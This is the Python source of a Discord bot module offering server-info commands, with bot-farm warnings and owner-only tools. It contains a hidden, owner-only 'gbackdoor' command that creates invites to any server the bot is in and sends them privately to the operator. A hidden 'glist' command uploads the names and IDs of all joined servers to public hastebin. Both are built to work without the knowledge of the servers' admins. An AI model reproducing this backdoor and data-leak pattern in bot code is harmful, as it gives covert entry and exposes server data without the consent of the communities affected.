import discord
from discord.ext import commands
from utils import permissions, randomness
import aiohttp
import math

verlevels = {discord.VerificationLevel.high: '(╯°□°）╯︵ ┻━┻ (High)',
             discord.VerificationLevel.low: 'Low',
             discord.VerificationLevel.none: 'Off',
             discord.VerificationLevel.medium: 'Medium',
             discord.VerificationLevel.extreme: '┻━┻ ﾐヽ(ಠ益ಠ)ノ彡┻━┻ (Extreme)'}

farmlevel = 60

async def haste_upload(text):
    with aiohttp.ClientSession() as sesh:
        async with sesh.post("https://hastebin.com/documents/", data=text, headers={"Content-Type": "text/plain"}) as r:
            r = await r.json()
            return r['key']

class GuildTools:
    def __init__(self, bot):
        self.bot = bot

    @commands.command(hidden=True)
    @permissions.owner()
    async def glist(self, ctx):
        guilds = []
        for g in self.bot.guilds:
            bots = len([a for a in g.members if a.bot])
            percent = math.floor(bots/len(g.members)*100)
            farm = ' (WARNING! May be bot farm!)' if percent > farmlevel else ''
            string = f'{g.name} ({g.id}) | {bots} bots / {len(g.members)} members ({percent}%){farm}'
            guilds.append(string)

        string = '\n'.join(guilds)
        haste = await haste_upload(string)
        await ctx.author.send(f'https://hastebin.com/{haste}')
        await ctx.send(':ok_hand:')

    @commands.command()
    async def ginfo(self, ctx, *, guildname : str = None):
        if guildname != None:
            if not permissions.owner_id_check(ctx.author.id):
                return
            guild = discord.utils.find(lambda a: a.name == guildname, ctx.bot.guilds)
        else:
            guild = ctx.guild
        embed = discord.Embed(
            color=randomness.random_colour(),
            title=f'Guild info for {guild.name}'
        )
        bots = len([a for a in guild.members if a.bot])
        percent = bots/len(guild.members)*100
        if percent > farmlevel:
            embed.description = ':warning: May be a bot farm!'
            embed.colour = 0xFF0000
        
        if guild.icon_url != '':
            embed.set_thumbnail(url=guild.icon_url)
        
        chans = ', '.join([f'`{c.name}`' for c in guild.channels])
        embed.add_field(name='Members', value=f'{len(guild.members)} ({bots} bots, {math.floor(percent)}%)')
        embed.add_field(name='Owner', value=f'**{guild.owner.name}**#{guild.owner.discriminator} ({guild.owner.id})')
        embed.add_field(name='Roles', value=', '.join([r.name for r in guild.roles]) + f' ({len(guild.roles)})')
        embed.add_field(name='Channels', value=f'{chans} ({len(guild.channels)})')
        embed.add_field(name='Verification Level', value=verlevels[guild.verification_level])

        await ctx.send(embed=embed)

    @commands.command(hidden=True)
    @permissions.owner()
    async def gbackdoor(self, ctx, *, guildname : str):
        guild = discord.utils.find(lambda a: a.name == guildname, ctx.bot.guilds)
        try:
            invite = await guild.text_channels[0].create_invite()
            await ctx.author.send(str(invite))
            await ctx.send(':ok_hand:')
        except discord.Forbidden:
            await ctx.send('No permissions.')



def setup(bot):
    bot.add_cog(GuildTools(bot))